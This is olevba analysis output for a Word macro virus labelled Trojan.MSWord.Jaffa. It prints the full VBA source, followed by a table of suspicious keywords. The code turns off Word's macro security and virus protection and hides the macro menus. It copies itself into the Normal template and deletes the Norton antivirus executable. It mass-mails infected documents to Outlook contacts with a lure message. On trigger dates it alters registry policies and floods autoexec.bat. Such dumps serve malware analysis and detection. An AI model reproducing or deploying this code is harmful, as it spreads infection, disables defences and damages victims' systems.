olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Jaffa-3712aec3485fab16cf5764f120418936621d6fbf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Jaffa-3712aec3485fab16cf5764f120418936621d6fbf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
On Error Resume Next
Select Case (Application.Version)
Case "9.0"
      System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
      CommandBars("Macro").Controls("Security...").Enabled = 0
      CommandBars("Macro").Controls("Macros...").Enabled = 0
      CommandBars("Tools").Controls("Customize...").Enabled = 0
      CommandBars("View").Controls("Toolbars").Enabled = 0
      CommandBars("View").Controls("Status Bar").Enabled = 0
      CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = 0
      CommandBars("Format").Controls("Style...").Enabled = 0
      Application.ScreenUpdating = False
      Application.DisplayStatusBar = False
      Application.DisplayAlerts = False
      Options.VirusProtection = False
Case "8.0"
      Optioons.VirusProtection = False
      Options.SaveNormalPrompt = False
      Options.ConfirmConversions = False
End Select

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeCaption") = "I feel the presence!"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeText") = "I feel the presence!"
Morph = ActiveDocument.FullName
Hit = NormalTemplate.Name
If ThisDocument.Name = "Normal.dot" Or "Normal.Dot" Then
Morph = Hit
Application.OrganizerCopy Morph, Hit, "Jaffa", wdOrginizerObjectProjectItems

fuck$ = "c:\mirc\script.ini"

Set FS = CreateObject("Scripting.FileSystemObject")
If FS.FileExists(fuck$) Then GoTo mircwrite Else GoTo fling

mircwrite:
Open "c:\mirc\script.ini" For Output As #1
Print #1, "[Script]"
Print #1, "n0;Miniscript"
Print #1, "n1= ON 1:JOIN:#:{ /exit } "
Print #1, "n2= ON 1:*xde*:#:{ /exit };"
Close #1
SetAttr "c:\mirc\script.ini", vbReadOnly
GoTo finish

fling:
MsgBox "Invalid Memory Space", vbCritical

finish:
End If
End Sub

Sub Document_Open()
CommandBars("Macro").Controls("Security...").Enabled = 0
CommandBars("Macro").Controls("Macros...").Enabled = 0
CommandBars("Tools").Controls("Customize...").Enabled = 0
CommandBars("View").Controls("Toolbars").Enabled = 0
CommandBars("View").Controls("Status Bar").Enabled = 0
CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = 0
CommandBars("Format").Controls("Style...").Enabled = 0
Application.ScreenUpdating = False
Application.DisplayStatusBar = False
Application.DisplayAlerts = False
Options.VirusProtection = False
End Sub
Sub AntiV()
On Error Resume Next
Set FS = Application.FileSearch
av$ = "NAVW32.exe"
With FS
.LookIn = "C:\"
.SearchSubFolders = True
.FileName = av$
If .Execute > 0 Then
Set ds = CreateObject("Scripting.FileSystemObject")
Set fy = ds.GetFile(es$)
h = (fy.Path)
SetAttr h, vbNormal
Kill (h)
Else
End If
End With
End Sub
Private Sub SpreadAction()
On Error Resume Next
Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
Set UngaDasOutlook = CreateObject("Outlook.Application")
Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
If UngaDasOutlook = "Outlook" Then
DasMapiName.Logon "profile", "password"
For x = 1 To DasMapiName.AddressLists.Count
Set AddyBook = DasMapiName.AddressLists(x)
y = 1
Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
For z = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(y)
BreakUmOffASlice.Recipients.Add Peep
y = y + 1
If y > 50 Then z = AddyBook.AddressEntries.Count
Next z
BreakUmOffASlice.Subject = "!Letter!" & Application.UserName
BreakUmOffASlice.Body = "This letter is part of an international project.Please read the attachement for more details. "
BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
BreakUmOffASlice.Send
Peep = ""
Next x
DasMapiName.Logoff
End If
End Sub


Sub ViewVBCode()
MsgBox "This program has performed an illegal operation and will be shut down.", vbCritical, "Microsoft Word"
End Sub

Sub ToolsMacro()
MsgBox "This program has performed an illegal operation and will be shut down.", vbCritical, "Microsoft Word"
End Sub

Sub FileTemplates()
MsgBox "This program has performed an illegal operation and will be shut down.", vbCritical, "Microsoft Word"
End Sub

Private Sub Detonator()
On Error Resume Next
RttsEvent = Format(Date, "dd-mm")
Select Case (RttsEvent)
Case "29-11"
MyMessage$ = "Today the Jaffa Project has been activated!"
Case "29-01"
MyMessage$ = "You start to feel the pain..."
System.PrivateProfileString("", "HKEY_CURRENT_USER\ControlPanel\Desktop", "MenuShowDelay") = "7500"
Case "01-01, 02-02, 03-03, 04-04, 05-05, 06-06, 07-07, 08-08, 09-09, 10-10, 11-11, 12-12"
MyMessage$ = "Its only a matter of time..."
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDrives") = "3"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDesktop") = "1"
Case Else
If Int(Rnd * 1000) <> 786 Then GoTo EndTrigger
End Select
Open "c:\autoexec.bat" For Append As #1
Print #1, "@ECHO OFF"
For I = 1 To 1000: Print #1, "echo " + MyMessage$: Next
Close #1
EndTrigger:
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |NAVW32.exe          |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

